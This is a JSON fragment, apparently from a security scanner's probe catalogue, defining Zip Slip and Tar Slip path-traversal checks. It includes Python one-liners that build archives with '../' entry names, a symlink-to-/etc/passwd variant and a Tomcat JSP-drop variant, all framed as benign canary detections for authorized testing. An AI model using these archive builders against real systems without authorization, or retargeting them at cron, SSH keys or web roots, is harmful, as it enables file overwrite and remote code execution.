    "zip_slip": {
      "description": "Zip Slip / Tar Slip / 7z Slip -- archive contains entries with ../ traversal in their NAME field. Extractor that concatenates extractDir + entryName without canonical path check writes the file outside the intended directory. Affects: ZIP, TAR, RAR, 7z, JAR/WAR/EAR (any Java unpacker using ZipEntry.getName() raw). CVE-2018-1002200 lineage. Detection-only -- write to a benign canary path (e.g. /tmp/zipslip_canary.txt) under a Collaborator-monitored marker; do NOT overwrite cron / authorized_keys / web roots (Rule 5).",
      "tech_match": [
        "java",
        "node",
        "python",
        "go",
        "php",
        "ruby"
      ],
      "param_match": [
        "file",
        "upload",
        "archive",
        "attachment",
        "import",
        "backup",
        "theme",
        "plugin"
      ],
      "probes": [
        {
          "payload": "PK\u0003\u0004...../tmp/zipslip_canary.txt",
          "description": "ZIP with single entry name . Hex-encoded ZIP local file header + central directory + EOCD. Builder script: python -c \"import zipfile; z=zipfile.ZipFile('slip.zip','w'); z.writestr('../../../../../../tmp/zipslip_canary.txt', 'CANARY-{{collaborator_id}}'); z.close()\". Detection: HTTP-trigger the server to fetch /tmp/zipslip_canary.txt (or have an OOB beacon read it) and confirm CANARY-id appears.",
          "matchers": [
            {
              "type": "collaborator",
              "expect_interaction": true
            },
            {
              "type": "status",
              "status": [
                200,
                201,
                204
              ]
            }
          ],
          "severity": "critical",
          "confidence_boost": 70,
          "variables": {
            "requires_collaborator": true,
            "manual_build": true
          }
        },
        {
          "payload": "tar archive with entry name ../etc/canary_zipslip",
          "description": "TAR-equivalent. Python builder: import tarfile, io; data=b'CANARY'; ti=tarfile.TarInfo(name='../etc/canary_zipslip'); ti.size=len(data); t=tarfile.open('slip.tar','w'); t.addfile(ti, io.BytesIO(data)); t.close(). Some Go libs (archive/tar pre-1.17) didn't reject ../ in names.",
          "matchers": [
            {
              "type": "collaborator",
              "expect_interaction": true
            },
            {
              "type": "status",
              "status": [
                200,
                201,
                204
              ]
            }
          ],
          "severity": "critical",
          "confidence_boost": 70,
          "variables": {
            "requires_collaborator": true,
            "manual_build": true
          }
        },
        {
          "payload": "ZIP with symlink entry pointing to /etc/passwd",
          "description": "Symlink-based slip -- ZIP entry is a symlink, second entry writes through it. Unzippers that honour symlinks (Linux unzip default, Python zipfile with target=) execute the symlink write outside dest. Detection canary -> /tmp/zipslip_symlink_canary.",
          "matchers": [
            {
              "type": "collaborator",
              "expect_interaction": true
            }
          ],
          "severity": "critical",
          "confidence_boost": 65,
          "variables": {
            "requires_collaborator": true,
            "manual_build": true
          }
        },
        {
          "payload": "ZIP with entry name C:\\windows\\temp\\canary.txt",
          "description": "Windows-only Zip Slip variant -- some Java libs on Windows treat the path as relative until they hit a drive letter, then jump root. Detection canary in %TEMP%.",
          "matchers": [
            {
              "type": "collaborator",
              "expect_interaction": true
            }
          ],
          "severity": "high",
          "confidence_boost": 60,
          "variables": {
            "requires_collaborator": true,
            "manual_build": true,
            "os": "windows"
          }
        },
        {
          "payload": "ZIP with entry name ../webapps/ROOT/canary.jsp containing benign <% out.print('CANARY'); %>",
          "description": "WAR/EAR Zip Slip -> Tomcat. Writing into webapps/ROOT/ from an admin-upload path causes Tomcat to deploy the JSP. Detection only -- payload prints a CANARY string when fetched, no shell, no eval.",
          "matchers": [
            {
              "type": "word",
              "words": [
                "CANARY"
              ]
            },
            {
              "type": "status",
              "status": [
                200
              ]
            }
          ],
          "severity": "critical",
          "confidence_boost": 70,
          "variables": {
            "requires_post_extraction_fetch": true,
            "manual_build": true
          }
        }
      ]
    }
  }
